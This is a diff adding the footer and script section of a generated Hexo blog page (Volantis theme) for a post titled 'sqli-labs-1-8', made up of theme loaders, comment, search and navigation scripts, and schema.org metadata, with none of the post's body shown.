+  pdata.commentPlaceholder="";
+  pdata.commentConfig={};
+  //  see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs
+  
+    // header
+    var l_header=document.getElementById("l_header");
+    
+    l_header.classList.add("show");
+    
+    
+      // cover
+      var cover_wrapper=document.querySelector('#l_cover .cover-wrapper');
+      var scroll_down=document.getElementById('scroll-down');
+      cover_wrapper.id="none";
+      cover_wrapper.style.display="none";
+      scroll_down.style.display="none";
+    
+  
+</script>
+</pjax>
+        </div>
+        
+  
+  <footer class="footer clearfix"  itemscope itemtype="http://schema.org/WPFooter">
+    <br><br>
+    
+      
+        <div class="aplayer-container">
+          
+
+
+        </div>
+      
+    
+      
+        <br>
+        <div class="social-wrapper" itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          
+            
+          
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>Blog content follows the <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
+</div>
+      
+    
+      
+        
+          <div><p><span id="lc-sv">本站总访问量为 <span id='number'><i class="fa-solid fa-loader fa-spin fa-fw" aria-hidden="true"></i></span> 次</span> <span id="lc-uv">访客数为 <span id='number'><i class="fa-solid fa-loader fa-spin fa-fw" aria-hidden="true"></i></span> 人</span></p>
+</div>
+        
+      
+    
+      
+        Use
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/#5.7.6" target="_blank" class="codename">Volantis</a>
+        as theme
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © since 2017 XXX</a></p>
+
+        </div>
+      
+    
+    <!-- Custom Files footer begin-->
+    
+    <!-- Custom Files footer end-->
+  </footer>
+
+
+        <a id="s-top" class="fa-solid fa-arrow-up fa-fw" href="/" onclick="return false;" title="top"></a>
+      </div>
+    </div>
+    <div>
+      <script>
+  /******************** volantis.dom ********************************/
+  // 页面选择器 将dom对象缓存起来 see: /source/js/app.js etc.
+  volantis.dom.bodyAnchor = volantis.dom.$(document.getElementById("safearea")); // 页面主体
+  volantis.dom.topBtn = volantis.dom.$(document.getElementById('s-top')); // 向上
+  volantis.dom.wrapper = volantis.dom.$(document.getElementById('wrapper')); // 整个导航栏
+  volantis.dom.coverAnchor = volantis.dom.$(document.querySelector('#l_cover .cover-wrapper')); // 1个
+  volantis.dom.switcher = volantis.dom.$(document.querySelector('#l_header .switcher .s-search')); // 搜索按钮   移动端 1个
+  volantis.dom.header = volantis.dom.$(document.getElementById('l_header')); // 移动端导航栏
+  volantis.dom.search = volantis.dom.$(document.querySelector('#l_header .m_search')); // 搜索框 桌面端 移动端 1个
+  volantis.dom.mPhoneList = volantis.dom.$(document.querySelectorAll('#l_header .m-phone .list-v')); //  手机端 子菜单 多个
+</script>
+
+<script>
+  
+  volantis.css("https://unpkg.com/volantis-static@0.0.1654736714924/libs/@fortawesome/fontawesome-free/css/all.min.css");
+  
+  
+  
+</script>
+
+<!-- required -->
+
+
+<!-- internal -->
+
+<script src="/js/app.js"></script>
+
+
+
+
+
+
+<!-- rightmenu要在darkmode之前（ToggleButton） darkmode要在comments之前（volantis.dark.push）-->
+
+
+
+<script>
+  function loadIssuesJS() {
+    
+      const sites_api = document.getElementById('sites-api');
+      if (sites_api != undefined && typeof SitesJS === 'undefined') {
+        volantis.js("/js/plugins/tags/sites.js")
+      }
+    
+    
+      const friends_api = document.getElementById('friends-api');
+      if (friends_api != undefined && typeof FriendsJS === 'undefined') {
+        volantis.js("/js/plugins/tags/friends.js")
+      }
+    
+    
+      const contributors_api = document.getElementById('contributors-api');
+      if (contributors_api != undefined && typeof ContributorsJS === 'undefined') {
+        volantis.js("/js/plugins/tags/contributors.js")
+      }
+    
+  };
+  loadIssuesJS()
+  volantis.pjax.push(()=>{
+    loadIssuesJS();
+  })
+
+</script>
+
+
+
+
+  <script defer src="https://unpkg.com/volantis-static@0.0.1654736714924/libs/vanilla-lazyload/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+
+
+  
+
+<script>
+  window.FPConfig = {
+	delay: 0,
+	ignoreKeywords: ["#"],
+	maxRPS: 6,
+	hoverDelay: 0
+  };
+</script>
+<script defer src="https://unpkg.com/volantis-static@0.0.1654736714924/libs/flying-pages/flying-pages.min.js"></script>
+
+
+
+
+
+
+
+
+
+      <script>
+  volantis.layoutHelper("comments",`<div id="giscus_container"></div>`)
+
+  volantis.giscus = {};
+
+  function check_giscus() {
+    if (volantis.dark.mode === "dark") {
+      volantis.giscus.Theme = 'dark';
+    } else {
+      volantis.giscus.Theme = 'light';
+    }
+
+    return document.getElementById("giscus_container");
+  }
+
+  function pjax_giscus() {
+    const HEAD = check_giscus();
+    if (!HEAD) return;
+    let cfg = Object.assign({"theme":{"light":"light","dark":"dark"}},pdata.commentConfig)
+    const script = document.createElement('script');
+    script.setAttribute('src', 'https://giscus.app/client.js');
+    Object.keys(cfg).forEach(k=>{
+      if (k != "theme") {
+        script.setAttribute('data-'+k, cfg[k]);
+      }
+    })
+    script.setAttribute('data-theme', volantis.giscus.Theme);
+    script.setAttribute('crossorigin', "anonymous");
+    HEAD.appendChild(script);
+  }
+
+  function dark_giscus() {
+    const HEAD = check_giscus();
+    if (!HEAD) return;
+
+    const message = {
+      setConfig: {
+        theme: volantis.giscus.Theme
+      }
+    };
+    const giscusIframe = document.querySelector('iframe.giscus-frame');
+    giscusIframe.contentWindow.postMessage({ giscus: message }, 'https://giscus.app');
+  }
+  pjax_giscus();
+  volantis.pjax.push(pjax_giscus);
+  volantis.dark.push(dark_giscus);
+</script>
+
+    
+
+
+
+
+
+<!-- optional -->
+
+  <script>
+  const SearchServiceDataPathRoot = ("/" || "/").endsWith("/") ?
+    "/" || "/" :
+    "//" || "/";
+  const SearchServiceDataPath = SearchServiceDataPathRoot + "content.json";
+
+  function loadSearchScript() {
+    // see: layout/_partial/scripts/_ctrl/cdnCtrl.ejs
+    return volantis.js("/js/search/hexo.js");
+  }
+
+  function loadSearchService() {
+    loadSearchScript();
+    document.querySelectorAll(".input.u-search-input").forEach((e) => {
+      e.removeEventListener("focus", loadSearchService, false);
+    });
+
+    document.querySelectorAll(".u-search-form").forEach((e) => {
+      e.addEventListener("submit", (event) => {
+        event.preventDefault();
+      }, false);
+    });
+  }
+
+  // 打开并搜索 字符串 s
+  function OpenSearch(s) {
+    if (typeof SearchService === 'undefined')
+      loadSearchScript().then(() => {
+        SearchService.setQueryText(s);
+        SearchService.search();
+      });
+    else {
+      SearchService.setQueryText(s);
+      SearchService.search();
+    }
+  }
+
+  // 访问含有 ?s=xxx  的链接时打开搜索 // 与搜索引擎 structured data 相关: /scripts/helpers/structured-data/lib/config.js
+  if (window.location.search && /^\?s=/g.test(window.location.search)) {
+    let queryText = decodeURI(window.location.search)
+      .replace(/\ /g, "-")
+      .replace(/^\?s=/g, "");
+    OpenSearch(queryText);
+  }
+
+  // 搜索输入框获取焦点时加载搜索
+  document.querySelectorAll(".input.u-search-input").forEach((e) => {
+    e.addEventListener("focus", loadSearchService, false);
+  });
+</script>
+
+
+
+
+
+
+
+  <script>
+
+
+
+  function pjax_highlightjs_copyCode(){
+    if (!(document.querySelector(".highlight .code pre") ||
+      document.querySelector(".article pre code"))) {
+      return;
+    }
+    VolantisApp.utilCopyCode(".highlight .code pre, .article pre code")
+  }
+  volantis.requestAnimationFrame(pjax_highlightjs_copyCode)
+  volantis.pjax.push(pjax_highlightjs_copyCode)
+
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  <script>
+  function load_swiper() {
+    if (!document.querySelectorAll(".swiper-container")[0]) return;
+    volantis.css("https://unpkg.com/volantis-static@0.0.1654736714924/libs/swiper/swiper-bundle.min.css");
+    volantis.js("https://unpkg.com/volantis-static@0.0.1654736714924/libs/swiper/swiper-bundle.min.js").then(() => {
+      pjax_swiper();
+    });
+  }
+
+  load_swiper();
+
+  function pjax_swiper() {
+    volantis.swiper = new Swiper('.swiper-container', {
+      slidesPerView: 'auto',
+      spaceBetween: 8,
+      centeredSlides: true,
+      loop: true,
+      pagination: {
+        el: '.swiper-pagination',
+        clickable: true,
+      },
+      navigation: {
+        nextEl: '.swiper-button-next',
+        prevEl: '.swiper-button-prev',
+      },
+    });
+  }
+
+  volantis.pjax.push(() => {
+    if (!document.querySelectorAll(".swiper-container")[0]) return;
+    if (typeof volantis.swiper === "undefined") {
+      load_swiper();
+    } else {
+      pjax_swiper();
+    }
+  });
+</script>
+
+
+<!-- pjax 标签必须存在于所有页面 否则 pjax error -->
+<pjax>
+
+</pjax>
+
+<script>
+  function listennSidebarTOC() {
+    const navItems = document.querySelectorAll(".toc li");
+    if (!navItems.length) return;
+    let targets = []
+    const sections = [...navItems].map((element) => {
+      const link = element.querySelector(".toc-link");
+      const target = document.getElementById(
+        decodeURI(link.getAttribute("href")).replace("#", "")
+      );
+      targets.push(target)
+      // 解除 a 标签 href 的 锚点定位, a 标签 href 的 锚点定位 会随机启用?? 产生错位???
+      link.setAttribute("onclick","return false;")
+      link.setAttribute("toc-action","toc-"+decodeURI(link.getAttribute("href")).replace("#", ""))
+      link.setAttribute("href","/")
+      // 配置 点击 触发新的锚点定位
+      link.addEventListener("click", (event) => {
+        event.preventDefault();
+        // 这里的 addTop 是通过错位使得 toc 自动展开.
+        volantis.scroll.to(target,{addTop: 5, observer:true})
+        // Anchor id
+        history.pushState(null, document.title, "#" + target.id);
+      });
+      return target;
+    });
+
+    function activateNavByIndex(target) {
+      if (target.classList.contains("active-current")) return;
+
+      document.querySelectorAll(".toc .active").forEach((element) => {
+        element.classList.remove("active", "active-current");
+      });
+      target.classList.add("active", "active-current");
+      let parent = target.parentNode;
+      while (!parent.matches(".toc")) {
+        if (parent.matches("li")) parent.classList.add("active");
+        parent = parent.parentNode;
+      }
+    }
+
+    // 方案一：
+    volantis.activateNavIndex=0
+    activateNavByIndex(navItems[volantis.activateNavIndex])
+    volantis.scroll.push(()=>{
+      if (targets[0].getBoundingClientRect().top >= 0) {
+        volantis.activateNavIndex = 0
+      }else if (targets[targets.length-1].getBoundingClientRect().top < 0) {
+        volantis.activateNavIndex = targets.length-1
+      } else {
+        for (let index = 0; index < targets.length; index++) {
+          const target0 = targets[index];
+          const target1 = targets[(index+1)%targets.length];
+          if (target0.getBoundingClientRect().top < 0&&target1.getBoundingClientRect().top >= 0) {
+            volantis.activateNavIndex=index
+            break;
+          }
+        }
+      }
+      activateNavByIndex(navItems[volantis.activateNavIndex])
+    })
+
+    // 方案二：
+    // IntersectionObserver 不是完美精确到像素级别 也不是低延时性的
+    // function findIndex(entries) {
+    //   let index = 0;
+    //   let entry = entries[index];
+    //   if (entry.boundingClientRect.top > 0) {
+    //     index = sections.indexOf(entry.target);
+    //     return index === 0 ? 0 : index - 1;
+    //   }
+    //   for (; index < entries.length; index++) {
+    //     if (entries[index].boundingClientRect.top <= 0) {
+    //       entry = entries[index];
+    //     } else {
+    //       return sections.indexOf(entry.target);
+    //     }
+    //   }
+    //   return sections.indexOf(entry.target);
+    // }
+    // function createIntersectionObserver(marginTop) {
+    //   marginTop = Math.floor(marginTop + 10000);
+    //   let intersectionObserver = new IntersectionObserver(
+    //     (entries, observe) => {
+    //       let scrollHeight = document.documentElement.scrollHeight;
+    //       if (scrollHeight > marginTop) {
+    //         observe.disconnect();
+    //         createIntersectionObserver(scrollHeight);
+    //         return;
+    //       }
+    //       let index = findIndex(entries);
+    //       activateNavByIndex(navItems[index]);
+    //     }, {
+    //       rootMargin: marginTop + "px 0px -100% 0px",
+    //       threshold: 0,
+    //     }
+    //   );
+    //   sections.forEach((element) => {
+    //     element && intersectionObserver.observe(element);
+    //   });
+    // }
+    // createIntersectionObserver(document.documentElement.scrollHeight);
+  }
+
+  document.addEventListener("DOMContentLoaded", ()=>{
+    volantis.requestAnimationFrame(listennSidebarTOC)
+  });
+  document.addEventListener("pjax:success", ()=>{
+    volantis.requestAnimationFrame(listennSidebarTOC)
+  });
+</script>
+
+
+
+<script>
+  document.onreadystatechange = function () {
+    if (document.readyState == 'complete') {
+      // 页面加载完毕 样式加载失败，或是当前网速慢，或是开启了省流模式
+      const { saveData, effectiveType } = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {}
+      if (getComputedStyle(document.querySelector("#safearea"), null)["display"] == "none" || saveData || /2g/.test(effectiveType)) {
+        document.querySelectorAll(".reveal").forEach(function (e) {
+          e.style["opacity"] = "1";
+        });
+        document.querySelector("#safearea").style["display"] = "block";
+      }
+    }
+  }
+</script>
+
+
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","sameAs":["https://github.com/volantis-x"],"description":"这是我的专属博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://chenzhengkai10.github.io/","name":"Dr4x3zz"}},{"@type":"ListItem","position":2,"item":{"@id":"https://chenzhengkai10.github.io/categories/sqli-labs/","name":"sqli-labs"}},{"@type":"ListItem","position":3,"item":{"@id":"https://chenzhengkai10.github.io/2022/12/21/sqli-labs-1-8/","name":"sqli-labs-1-8"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","keywords":null,"description":"这是我的专属博客","author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","description":"这是我的专属博客"},"publisher":{"@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://chenzhengkai10.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"sqli-labs-1-8","description":"# sqli-labs-1-8","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https://chenzhengkai10.github.io/2022/12/21/sqli-labs-1-8/"},"author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/"},"publisher":{"@type":"Organization","name":"Dr4x3zz","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://chenzhengkai10.github.io/2022/12/21/sqli-labs-1-8/","wordCount":15,"datePublished":"2022-12-21T12:20:08.000Z","dateModified":"2023-11-03T16:16:22.000Z","articleSection":"sqli-labs","keywords":"sqli-labs","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+
+
+
+      
+        <!--
+  pjax重载区域接口：
+  1.  <pjax></pjax> 标签 pjax 标签必须存在于所有页面 否则 pjax error
+  2.  script[data-pjax]
+  3.  .pjax-reload script
+  4.  .pjax
+-->
+
+
+
+<script src="https://unpkg.com/volantis-static@0.0.1654736714924/libs/pjax/pjax.min.js"></script>
+
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox]):not([onclick="return false;"]):not([onclick="return!1"]):not([target="_blank"]):not([target="view_window"]):not([href$=".xml"])',
+        selectors: [
+          "head title",
+          "head meta[name=keywords]",
+          "head meta[name=description]",
+          
+          "#l_main",
+          "#pjax-header-nav-list",
+          ".pjax",
+          "pjax", // <pjax></pjax> 标签
+          "script[data-pjax], .pjax-reload script" // script标签添加data-pjax 或 script标签外层添加.pjax-reload 的script代码段重载
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000,
+        
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      //window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      // 使用 volantis.pjax.send 方法传入pjax:send回调函数 参见layout/_partial/scripts/global.ejs
+      volantis.pjax.method.send.start();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 使用 volantis.pjax.push 方法传入重载函数 参见layout/_partial/scripts/global.ejs
+      volantis.pjax.method.complete.start();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      if(volantis.debug) {
+        console.error(e);
+        console.log('pjax error: \n' + JSON.stringify(e));
+      }else{
+        // 使用 volantis.pjax.error 方法传入pjax:error回调函数 参见layout/_partial/scripts/global.ejs
+        volantis.pjax.method.error.start();
+        window.location.href = e.triggerElement.href;
+      }
+    });
+</script>
+
+      
+    </div>
+    <!-- import body_end begin-->
+    <!-- import body_end end-->
+    <!-- Custom Files bodyEnd begin-->
+    
+    <!-- Custom Files bodyEnd end-->
+    <script src="https://gcore.jsdelivr.net/gh/zyoushuo/Blog/hexo/js/mouse_slide.js"></script>
+    <script src="https://gcore.jsdelivr.net/gh/zyoushuo/Blog/hexo/js/mouse_click.js"></script>
+  </body>
+</html>
